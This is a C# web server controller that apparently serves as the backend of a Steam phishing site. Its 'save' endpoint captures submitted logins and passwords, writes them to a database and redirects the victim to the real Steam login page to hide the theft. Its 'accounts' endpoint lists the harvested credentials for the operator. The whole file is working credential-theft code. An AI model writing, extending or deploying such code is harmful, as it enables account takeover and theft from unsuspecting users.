using System.Net;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using HTTPServer.Models;
using HTTPServer.Services;

namespace HTTPServer.Controllers
{
    [ApiController("api")]
    public class ApiController
    {
        [HttpGet("accounts")]
        public async Task<HttpListenerResponse> GetAccountsAsync(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;
            if (request.QueryString.Count > 1)
                return response.SetStatusCode((int)HttpStatusCode.NoContent)
                               .SetContentType(".html");
            else if(request.QueryString.Count == 1 && request.QueryString.GetKey(0) == "id")
            {
                var args = request.QueryString.GetValues(0);
                if (args.Length == 1 && int.TryParse(args[0], out int id))
                {
                    var account = DBProvider.GetSteamAccount(id);
                    if (account != null)
                        response.WriteToBody(Encoding.UTF8.GetBytes(account.ToString()));
                    else
                        response.WriteToBody(Encoding.UTF8.GetBytes("No Accounts found"));
                }
                else
                    return response.SetStatusCode((int)HttpStatusCode.NoContent)
                                   .SetContentType(".html");
            }
            else
            {
                var list = DBProvider.GetSteamAccounts();
                await JsonSerializer.SerializeAsync(response.OutputStream, list);
            }

            return response.SetStatusCode(200).SetContentType(".txt");
        }


        //TODO: сделать обработчик параметров, передавть уже готовую модель
        [HttpPost("save")]
        public async Task<HttpListenerResponse> SaveAccountAsync(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;
            var parameters = await HttpListenerRequestHelper.GetBodyDataAsync(request);
            if(TryParse(parameters, out SteamAccount? account))
            {
                var executed = await DBProvider.WriteToDatabaseAsync(account);
                if (executed)
                {
                    response.Headers.Set("Location", @"https://store.steampowered.com/login");
                    return response.SetStatusCode((int)HttpStatusCode.SeeOther);
                }
            }
            response.Headers.Set("Location", @"/");
            return response.SetStatusCode((int)HttpStatusCode.Redirect);
        }

        private static bool TryParse(string parameters, out SteamAccount? account)
        {
            string pattern = @"login=\b(\w+?[a-zA-Z0-9]_?)\b&password=\b(\w+?[a-zA-Z0-9]\№?\%?\??\*?\(?\)?\@?\#?\$?\^?\&?_?)\b";
            Regex rg = new Regex(pattern);
            if (string.IsNullOrEmpty(parameters) || !rg.IsMatch(parameters))
            {
                account = null;
                return false;
            }
            var data = parameters.Split(new[] { "/", "?", "login", "=", "password", "&" }, StringSplitOptions.RemoveEmptyEntries);
            if (data.Length == 2)
            {
                account = new SteamAccount() { Login = data[0], Password = data[1] };
                return true;
            }
            account = null;
            return false;
        }
    }
}